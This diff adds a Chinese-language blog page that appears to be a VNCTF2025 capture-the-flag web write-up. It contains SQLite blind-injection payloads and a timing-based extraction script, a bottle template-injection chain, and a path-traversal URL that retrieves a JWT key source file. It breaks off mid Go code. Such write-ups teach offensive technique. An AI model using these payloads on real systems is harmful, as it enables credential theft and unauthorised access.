@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="奶龙回家就一个登录框。。尝试sql注入   回显发生了某种错误？？实锤sql注入 bp fuzz一下看看过滤   过滤了&#x3D; sleep union length等等 先随便测测 12345&#123;&quot;username&quot;:&quot;123&#x27;&#x2F;**&#x2F;or&#x2F;**&#x2F;&#x27;1&#x27;&lt;&#x27;2&quot;,&quot;password&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VNCTF2025-Web-wp">
+<meta property="og:url" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="奶龙回家就一个登录框。。尝试sql注入   回显发生了某种错误？？实锤sql注入 bp fuzz一下看看过滤   过滤了&#x3D; sleep union length等等 先随便测测 12345&#123;&quot;username&quot;:&quot;123&#x27;&#x2F;**&#x2F;or&#x2F;**&#x2F;&#x27;1&#x27;&lt;&#x27;2&quot;,&quot;password&amp;quo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215151012213.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215152313743.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215153953719.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215170055294.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215170412217.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215174546841.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215175408704.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215180048030.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215183104538.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215183500685.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215184451698.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215184700593.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215184804371.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215184848657.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215185205197.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215185252625.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215190338915.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216180900606.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216181116855.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216181655638.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216182846919.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216184650642.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216184841658.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216185142267.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216190820178.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216191127008.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216194011009.png">
+<meta property="og:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250216194234363.png">
+<meta property="article:published_time" content="2025-02-16T11:44:02.000Z">
+<meta property="article:modified_time" content="2025-02-16T11:57:46.295Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/image-20250215151012213.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VNCTF2025-Web-wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&text=VNCTF2025-Web-wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&is_video=false&description=VNCTF2025-Web-wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VNCTF2025-Web-wp&body=Check out this article: http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&title=VNCTF2025-Web-wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&name=VNCTF2025-Web-wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/02/16/VNCTF2025-Web-wp/&t=VNCTF2025-Web-wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="toc-number">1.</span> <span class="toc-text">奶龙回家</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">学生姓名登记系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gin"><span class="toc-number">3.</span> <span class="toc-text">Gin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-emlog"><span class="toc-number">4.</span> <span class="toc-text">ez_emlog</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VNCTF2025-Web-wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-16T11:44:02.000Z" class="dt-published" itemprop="datePublished">2025-02-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h2><p>就一个登录框。。尝试sql注入</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215151012213.png" class="" title="图片引用方法一">
+
+<p>回显发生了某种错误？？实锤sql注入</p>
+<p>bp fuzz一下看看过滤</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215152313743.png" class="" title="图片引用方法一">
+
+<p>过滤了&#x3D; sleep union length等等</p>
+<p>先随便测测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/&#x27;1&#x27;&lt;&#x27;2&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/1&lt;2/*&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/1&lt;2--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>都是回显账号或密码错误，过滤挺多，感觉只能盲注了。试了半天的database()不行。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/substr(sqlite_version(),1,1)&gt;&#x27;0&#x27;--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显账号或密码错误，正常了！说明数据库为sqlite，sqlite没有sleep函数，但是有randomblob函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;123&#x27;/**/or/**/(case/**/when/**/(substr(sqlite_version(),1,1)&gt;&#x27;0&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;,&quot;password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215153953719.png" class="" title="图片引用方法一">
+
+<p>出现明显的时间延迟。可以采用时间盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node.vnteam.cn:47824/login&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="comment">#payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/name/**/from/**/sqlite_master/**/where/**/type&lt;&#x27;zable&#x27;),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        <span class="comment">#payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(sql))/**/from/**/sqlite_master/**/where/**/type/**/like/**/&#x27;table&#x27;/**/and/**/name/**/like/**/&#x27;users&#x27;),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span></span><br><span class="line">        payload = <span class="string">&quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/group_concat(password)from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(500000000)/**/else/**/0/**/end)/*&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(mid))</span><br><span class="line">        datas = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">     	&#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        res = requests.post(url=url,json=datas)</span><br><span class="line">        end_time=time.time()</span><br><span class="line">        spend_time=end_time-start_time</span><br><span class="line">        <span class="keyword">if</span> spend_time&gt;=<span class="number">1</span>:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<p>依次爆出username和password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: nailong</span><br><span class="line">password: woaipangmao114514</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215170055294.png" class="" title="图片引用方法一">
+
+
+
+
+
+<h2 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a>学生姓名登记系统</h2><img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215170412217.png" class="" title="图片引用方法一">
+
+<p>单文件框架？谷歌搜索一下得知为bottle框架，比较冷门，我们看看官方手册：<a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/">https://www.osgeo.cn/bottle/</a></p>
+<p>它的模板引擎叫SimpleTemplate，考察的估计就是ssti了</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215174546841.png" class="" title="图片引用方法一">
+
+<p>测的时候我们发现单行最长23字符，不然会报错，同时我们发现python版本为3.12.x，python3.8以后出现了海象运算符，可以进行拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=&#x27;&#x27;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;b:=a.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;c:=b.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;d:=c()[154]&#125;&#125;</span><br><span class="line">&#123;&#123;e:=d.__init__&#125;&#125;</span><br><span class="line">&#123;&#123;f:=e.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接在__globals__中找到了flag</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215175408704.png" class="" title="图片引用方法一">
+
+
+
+
+
+<h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><p>一道go的白盒审计</p>
+<img src="/2025/02/16/VNCTF2025-Web-wp/image-20250215180048030.png" class="" title="图片引用方法一">
+
+<p>看到这里，可以猜想一下大致思路，存在admin用户和user用户，user用户可以上传文件，admin用户可以eval执行命令。同时存在jwt鉴权，那肯定与jwt有关了嘛</p>
+<p>然后看一下eval路由是怎么执行命令的：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Eval</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	code := c.PostForm(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">	log.Println(code)</span><br><span class="line">	<span class="keyword">if</span> code == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;No code provided&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	log.Println(containsBannedPackages(code))</span><br><span class="line">	<span class="keyword">if</span> containsBannedPackages(code) &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Code contains banned packages&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	tmpFile, err := ioutil.TempFile(<span class="string">&quot;&quot;</span>, <span class="string">&quot;goeval-*.go&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Error creating temp file:&quot;</span>, err)</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error creating temporary file&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> os.Remove(tmpFile.Name())</span><br><span class="line"></span><br><span class="line">	_, err = tmpFile.WriteString(code)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Error writing code to temp file:&quot;</span>, err)</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, <span class="literal">nil</span>, <span class="string">&quot;Error writing code to temp file&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;go&quot;</span>, <span class="string">&quot;run&quot;</span>, tmpFile.Name())</span><br><span class="line">	output, err := cmd.CombinedOutput()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">&quot;Error running Go code:&quot;</span>, err)</span><br><span class="line">		response.Response(c, http.StatusInternalServerError, <span class="number">500</span>, gin.H&#123;<span class="string">&quot;error&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;Error executing code&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	response.Success(c, gin.H&#123;<span class="string">&quot;result&quot;</span>: <span class="type">string</span>(output)&#125;, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实就是执行一个go文件，这个go文件就是我们上传的，再有由admin用户来执行！</p>
+<p>那么我们首先需要关注的是jwt伪造。要获取secret_key先，应该是保存在key.go，那么我们要怎么获得呢？？？</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Download</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	filename := c.DefaultQuery(<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> filename == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">400</span>, <span class="literal">nil</span>, <span class="string">&quot;Filename is required&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	basepath := <span class="string">&quot;./uploads&quot;</span></span><br><span class="line">	filepath, _ := url.JoinPath(basepath, filename)</span><br><span class="line">	<span class="keyword">if</span> _, err := os.Stat(filepath); os.IsNotExist(err) &#123;</span><br><span class="line">		response.Response(c, http.StatusBadRequest, <span class="number">404</span>, <span class="literal">nil</span>, <span class="string">&quot;File not found&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Header(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span>+filename)</span><br><span class="line">	c.File(filepath)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>JoinPath一眼目录穿越，可以任意下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node.vnteam.cn:45733/download?filename=/../config/key.go</span><br></pre></td></tr></table></figure>
+
+<p>直接拿下key.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Key</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;r00t32l&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Year</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2025</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获得一个Key和一个Year的。</p>
+<p>看看jwt密钥生成逻辑</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	rand.Seed(config.Year())</span><br><span class="line">	randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">	key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, config.Key())</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地模拟一下。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenerateKey</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	rand.Seed(<span class="number">2025</span>)</span><br><span class="line">	randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">	key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, <span class="string">&quot;r00t32l&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	